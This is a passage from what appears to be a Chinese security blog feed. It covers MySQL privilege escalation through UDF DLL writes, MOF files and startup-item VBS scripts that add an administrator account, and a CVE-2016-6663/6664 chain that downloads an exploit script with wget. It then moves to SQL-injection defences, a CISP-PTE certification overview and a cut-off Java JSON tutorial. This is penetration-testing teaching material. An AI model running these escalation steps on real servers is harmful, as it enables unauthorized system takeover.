class="hljs-keyword">SELECT</span>后面的是动态链接库的十六进制编码，非常长长长长长<br><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x4d5a900003</span>... <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;D:/mysql/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><p>现在就可以自定义函数了：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval RETURNS <span class="hljs-keyword">STRING</span> SONAME <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>如果这里创建失败，可以尝试修改dll名字，不要有特殊字符，比如为：udf.dll</p></blockquote><p>成功后就创建了一个函数<code>sys_eval</code>，现在就可以执行系统命令了：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">SELECT</span> sys_eval(<span class="hljs-symbol">&#x27;whoami</span>&#x27;);<br></code></pre></td></tr></table></figure><p>使用后可以删除自定义函数：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">drop <span class="hljs-keyword">function</span> <span class="hljs-title">sys_eval;</span><br></code></pre></td></tr></table></figure><h4 id="MDF提权"><a href="#MDF提权" class="headerlink" title="MDF提权"></a>MDF提权</h4><p>现在通过mof文件来进行提权已经非常困难了，因为它支持提权版本只有2003和一些之前的版本。mof的提权原理为mof文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入<code>c:/windows/system32/wbem/mof/</code>，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p><p><strong>条件</strong>：</p><ul><li>windows 03及以下版本</li><li>mysql启动身份具有权限去读写<code>c:/windows/system32/wbem/mof</code>目录</li><li>secure-file-priv参数不为null</li></ul><p>MOF脚本：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs swift">#pragma namespace(<span class="hljs-string">&quot;<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>root<span class="hljs-subst">\\</span>subscription&quot;</span>) <br><br>instance of __EventFilter <span class="hljs-keyword">as</span> <span class="hljs-variable">$EventFilter</span> <br>&#123; <br>    <span class="hljs-type">EventNamespace</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Root<span class="hljs-subst">\\</span>Cimv2&quot;</span>; <br>    <span class="hljs-type">Name</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    <span class="hljs-type">Query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa <span class="hljs-subst">\&quot;</span>Win32_LocalTime<span class="hljs-subst">\&quot;</span> &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    <span class="hljs-type">QueryLanguage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of <span class="hljs-type">ActiveScriptEventConsumer</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$Consumer</span> <br>&#123; <br>    <span class="hljs-type">Name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    <span class="hljs-type">ScriptingEngine</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;JScript&quot;</span>; <br>    <span class="hljs-type">ScriptText</span> <span class="hljs-operator">=</span> <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(<span class="hljs-subst">\&quot;</span>WScript.Shell<span class="hljs-subst">\&quot;</span>)<span class="hljs-subst">\n</span>WSH.run(<span class="hljs-subst">\&quot;</span>net.exe user suifeng p@ssw0rd /add<span class="hljs-subst">\&quot;</span>)<span class="hljs-subst">\n</span>WSH.run(<span class="hljs-subst">\&quot;</span>net.exe localgroup administrators suifeng /add<span class="hljs-subst">\&quot;</span>)&quot;</span>;   #创建用户<br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    <span class="hljs-type">Consumer</span>   <span class="hljs-operator">=</span> <span class="hljs-variable">$Consumer</span>; <br>    <span class="hljs-type">Filter</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$EventFilter</span>; <br>&#125;;<br></code></pre></td></tr></table></figure><p>首先将MOF脚本上传到有读写权限的目录下，然后通过SQL语句写入到<code>c:/windows/system32/wbem/mof/</code>：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;[文件路径]/test.mof&quot;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></code></pre></td></tr></table></figure><p>这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以用<code>dumpfile</code>导出一行数据。</p><p>然后等待五秒后用<code>net user</code>命令可以看到创建的用户。</p><p><strong>弊端</strong>：</p><p>提权成功后，就算被删号，MOF也会在五秒内将原账号重建，所以需要暂时关闭<code>winmgmt</code>服务，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#停止winmgmt服务</span><br>net stop winmgmt<br><span class="hljs-comment">#删除Repository文件夹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><span class="hljs-comment">#重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><blockquote><p>[MySQL提权之mof提权 - My_Dreams - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/zzjdbk/p/12991468.html#:~:text=mof%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86">https://www.cnblogs.com/zzjdbk/p/12991468.html#:~:text=mof提权原理</a> 关于 mof 提权的原理其实很简单，就是利用了 c%3A%2Fwindows%2Fsystem32%2Fwbem%2Fmof%2F 目录下的 nullevt.mof,文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。 下面简单演示下 mof 提权的过程！ MOF提权的条件要求十分严苛： 1.windows 03及以下版本)</p></blockquote><h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><p>MySQL的启动项提权，原理就是通过mysql把一段vbs脚本导入到系统的启动项下，如果管理员启动或者重启服务器，那么该脚本就会被调用，并执行vbs脚本里面的命令。</p><p><strong>启动项路径</strong>：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#2003</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\Administrator\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\All</span> Users<span class="hljs-string">\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br><span class="hljs-comment">#2008</span><br>C:<span class="hljs-string">\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br>C:<span class="hljs-string">\ProgramData\Microsoft\Windows\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br></code></pre></td></tr></table></figure><p>通过SQL命令写入文件：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> a (cmd <span class="hljs-type">text</span>); <br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a <span class="hljs-keyword">values</span> (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); <br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a <span class="hljs-keyword">values</span> (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user [用户名] [密码] /add&quot;&quot;,0) &quot; ); <br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a <span class="hljs-keyword">values</span> (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators suifeng /add&quot;&quot;,0) &quot; ); <br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> a <span class="hljs-keyword">into</span> outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;<br></code></pre></td></tr></table></figure><p>当服务器重启的时候，就会创建新用户了。</p><h4 id="CVE-2016-6663和CVE-2016-6664组合提权"><a href="#CVE-2016-6663和CVE-2016-6664组合提权" class="headerlink" title="CVE-2016-6663和CVE-2016-6664组合提权"></a>CVE-2016-6663和CVE-2016-6664组合提权</h4><p>在一些Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本，都可以利用CVE-2016-6663、CVE-2016-6664组合对其进行测试提权。</p><p>首先利用CVE-2016-6663将www-data权限提升为mysql权限：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br>gcc mysql-privesc-race.c -o mysql-privesc-race -I<span class="hljs-regexp">/usr/i</span>nclude/mysql -lmysqlclient<br>./mysql-privesc-race test <span class="hljs-number">123456</span> localhost testdb<br></code></pre></td></tr></table></figure><p>然后利用CVE-2016-6664将Mysql权限提升为root权限：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>legalhackers.com<span class="hljs-regexp">/exploits/</span>CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">6664</span>/mysql-chowned.sh<br>chmod <span class="hljs-number">777</span> mysql-chowned.sh<br>.<span class="hljs-regexp">/mysql-chowned.sh /</span>var<span class="hljs-regexp">/log/my</span>sql/error.log<br></code></pre></td></tr></table></figure><h2 id="绕过waf的方法"><a href="#绕过waf的方法" class="headerlink" title="绕过waf的方法"></a>绕过waf的方法</h2><p><a href="https://www.freebuf.com/articles/web/163783.html">SQL注入 | 9种绕过Web应用程序防火墙的方式 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/cute-puli/p/11146625.html">SQL注入绕过waf的一万种姿势 - 铺哩 - 博客园 (cnblogs.com)</a></p><p>这个另开文章介绍。</p><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><p>SQL注入防御方法：</p><ul><li>SQL语句预编译，这是最有效的方式了；<a href="https://www.zhihu.com/question/43581628">数据库预编译为何能防止SQL注入？ - 知乎 (zhihu.com)</a></li><li>检查变量类型和格式</li><li>过滤特殊字符</li><li>特殊字符转义</li><li>WAF</li></ul><h3 id="PHP防SQL注入"><a href="#PHP防SQL注入" class="headerlink" title="PHP防SQL注入"></a>PHP防SQL注入</h3><p>PHP中的预编译方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sql_server</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$sql_username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$sql_password</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$sql_database</span> = <span class="hljs-string">&quot;person&quot;</span>;<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$sql_server</span>, <span class="hljs-variable">$sql_username</span>, <span class="hljs-variable">$sql_password</span>, <span class="hljs-variable">$sql_database</span>);<br><span class="hljs-comment">// 预编译语句</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;SELECT * FROM person WHERE name=?&#x27;</span>);<br><span class="hljs-comment">// 绑定参数</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;yy&#x27;</span>;<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-comment">// 执行语句</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-comment">// 暂存结果</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br><span class="hljs-comment">// 查询个数</span><br><span class="hljs-variable">$lines</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br><span class="hljs-comment">// 绑定变量以接收结果，返回多少列就设置多少个变量</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$age</span>);<br><span class="hljs-comment">// 循环取值</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot; : &quot;</span> . <span class="hljs-variable">$age</span> . <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="JAVA防SQL注入"><a href="#JAVA防SQL注入" class="headerlink" title="JAVA防SQL注入"></a>JAVA防SQL注入</h3><p>JAVA中的预编译方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Query</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">ps</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 获取连接对象</span><br>conn = DBUtil.newInstance();<br><span class="hljs-comment">// 定义SQL</span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from emp where ename=? and dno=?&quot;</span>;<br><span class="hljs-comment">// 预编译SQL</span><br>ps = conn.prepareStatement(sql);<br><span class="hljs-comment">// 动态的给占位符设置参数，参数一代表占位符的位置（从1开始） 参数二代表要设置的值</span><br>ps.setString(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;yy&quot;</span>);<br>ps.setInt(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br><span class="hljs-comment">// 执行SQL获取结果集</span><br>rs = ps.executeQuery();<br><span class="hljs-type">Emp</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-comment">// 遍历结果集</span><br><span class="hljs-keyword">while</span> (rs.next()) &#123;<br>emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Emp</span>();<br>emp.setEno(rs.getInt(<span class="hljs-string">&quot;eno&quot;</span>));<br>emp.setEname(rs.getString(<span class="hljs-string">&quot;ename&quot;</span>));<br>emp.setSex(rs.getString(<span class="hljs-string">&quot;sex&quot;</span>));<br>emp.setBirthday(rs.getDate(<span class="hljs-string">&quot;birthday&quot;</span>));<br>emp.setPhone(rs.getString(<span class="hljs-string">&quot;phone&quot;</span>));<br>emp.setDno(rs.getInt(<span class="hljs-string">&quot;dno&quot;</span>));<br>&#125;<br>System.out.println(emp);<br><br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>e.printStackTrace();<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>DBUtil.close(conn, ps, rs);<br>&#125;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://www.anquanke.com/post/id/85936">【技术分享】MySQL 注入攻击与防御-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] cisp-pte介绍</title>
    <link href="/2022/10/10/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20cisp-pte%E4%BB%8B%E7%BB%8D/"/>
    <url>/2022/10/10/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20cisp-pte%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="cisp-pte介绍"><a href="#cisp-pte介绍" class="headerlink" title="cisp-pte介绍"></a>cisp-pte介绍</h1><p><strong>注册信息安全专业人员-渗透测试工程师&#x2F;专家（CISP-PTE&#x2F;PTS）培训</strong>是由中国信息安全测评中心和CISP攻防领域考试中心统一管理和规范的信息安全专业培训，是国内最为主流及被业界认可的攻防领域渗透测试方向的专业资质培训。CISP-PTE&#x2F;PTS目前是国内唯一针对网络安全渗透测试专业人才的资格认证，也是国家对信息安全人员资质的最高认可。</p><blockquote><p>来源：<a href="https://www.uvsec.com/certification/cnitsec/3.html">注册渗透测试工程师&#x2F;专家（CISP-PTE&#x2F;PTS）认证-中国信息安全测评中心-CNITSEC-成都中科至善信息技术有限公司 (uvsec.com)</a></p></blockquote><h2 id="认证内容"><a href="#认证内容" class="headerlink" title="认证内容"></a>认证内容</h2><p>在整个CISP-PTE&#x2F;PTS知识体系结构中，共包括 web 安全、中间件安全、操作系统安全、数据库安全，渗透测试五个知识类，每个知识类根据其逻辑划分为多个知识体，每个知识体包含多个知识域，每个知识域由一个或多个知识子域组成。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010204342223.png" alt="image-20221010204342223"></p><p>注册渗透测试认证知识体系结构共包含五个知识类，分别为：</p><p>1、<strong>web安全基础</strong>：主要包括HTTP协议、注入漏洞、XSS漏洞、SSRF漏洞、 CSRF 漏洞、文件处理漏洞、访问控制漏洞、会话管理漏洞等相关的技术知识和实践。<br>2、<strong>中间件安全基础</strong>：主要包括Apache、IIS、Tomcat、weblogic、websphere、 Jboss 等相关的技术知识和实践。<br>3、<strong>操作系统安全基础</strong>：主要包括Windows操作系统、Linux操作系统相关技术知识和实践。<br>4、数据库安全基础：主要包括Mssql数据库、Mysql数据库、Oracle数据库、Redis 数据库相关技术知识和实践。<br>5、<strong>渗透测试</strong>：主要包括信息收集，漏洞发现，漏洞利用相关技术知识和实践。</p><p><strong>CISP渗透测试培训内容（其中红色字体为CISP-PTS需要掌握的知识）</strong></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010204912031.png" alt="image-20221010204912031"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010205026356.png" alt="image-20221010205026356"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010205044628.png" alt="image-20221010205044628"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221010205101174.png" alt="image-20221010205101174"></p><h2 id="考试形式"><a href="#考试形式" class="headerlink" title="考试形式"></a>考试形式</h2><p>1、<strong>CISP-PTE</strong>考试题型为客观题、实操题，客观题为单项选择题，共20题，每题1分；实操题8道，共80分。总分100分，得分70分以上（含70分）为通过。</p><p>2、<strong>CISP-PTS</strong>考试题型为实操题，共10题，每题10分，总分100分，得分70分以上（含70分）为通过。</p><table><thead><tr><th><strong>渗透测试知识类别</strong></th><th><strong>CISP-PTE分值占比</strong></th><th><strong>CISP-PTS分值占比</strong></th></tr></thead><tbody><tr><td>Web安全</td><td>50%</td><td>30%</td></tr><tr><td>操作系统与中间件</td><td>20%</td><td>30%</td></tr><tr><td>数据与日志分析</td><td>10%</td><td>10%</td></tr><tr><td>渗透测试</td><td>20%</td><td>30%</td></tr></tbody></table><h2 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h2><p>成为注册信息安全专业人员-渗透测试工程师&#x2F;专家（CISP-PTE&#x2F;PTS）,必须同时满足以下基本要求：</p><p>1、CISP-PTE&#x2F;PTS报考人员需具备一定渗透测试能力，或有意向从事渗透测试，包含信息安全相关专业高校生；<br>2、CISP-PTE&#x2F;PTS无学历与工作经验的报考要求；<br>3、通过CISP攻防领域考试中心组织的CISP-PTE&#x2F;PTS考试；<br>4、同意并遵守CISP-PTE&#x2F;PTS职业准则；<br>5、满足CISP-PTE&#x2F;PTS注册要求并成功通过审核；<br>6、证书有效期三年，证书失效后，需重新参加CISP-PTE注册考试。</p><h2 id="收费标准"><a href="#收费标准" class="headerlink" title="收费标准"></a>收费标准</h2><p>1、CISP-PTE认证是全国统一收费标准，<strong>19800元&#x2F;人</strong>。</p><p> 具体收费内容包含培训费+注册费，其中培训费14800元&#x2F;人，注册考试费5000元&#x2F;人。</p><p>2、CISP-PTS认证是全国统一收费标准，<strong>27800元&#x2F;人</strong>。</p><p> 具体收费内容包含培训费+注册费，其中培训费19800元&#x2F;，注册考试费8000元&#x2F;人。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>cisp-pte</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] java读写json文件</title>
    <link href="/2022/10/09/%5Bjava%5D%20java%E8%AF%BB%E5%86%99json%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/09/%5Bjava%5D%20java%E8%AF%BB%E5%86%99json%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="java读写json文件"><a href="#java读写json文件" class="headerlink" title="java读写json文件"></a><code>java</code>读写<code>json</code>文件</h1><p><code>java</code>读写<code>json</code>还真实麻烦，找了很多方法，最后发现还是<code>fastjson</code>最好用。</p><p>这里用到了两个包，<code>maven</code>导包：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba.fastjson2/fastjson2 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-io/commons-io --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="写入到json文件"><a href="#写入到json文件" class="headerlink" title="写入到json文件"></a>写入到<code>json</code>文件</h2><p>定义这样的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeJson</span><span class="hljs-params">(String fileName, Object obj)</span>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(obj);<br>    <span class="hljs-keyword">try</span> &#123;<br>        FileUtils.write(file, jsonString, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先测试写入<code>HashMap</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;xx&quot;</span>, <span class="hljs-string">&quot;111&quot;</span>);<br>map.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>);<br>map.put(<span class="hljs-string">&quot;zz&quot;</span>, <span class="hljs-string">&quot;333&quot;</span>);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/fastjson.json&quot;</span>;<br><br>writeJson(fileName, map);<br></code></pre></td></tr></table></figure><p>最后得到的文件内容为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;xx&quot;</span><span 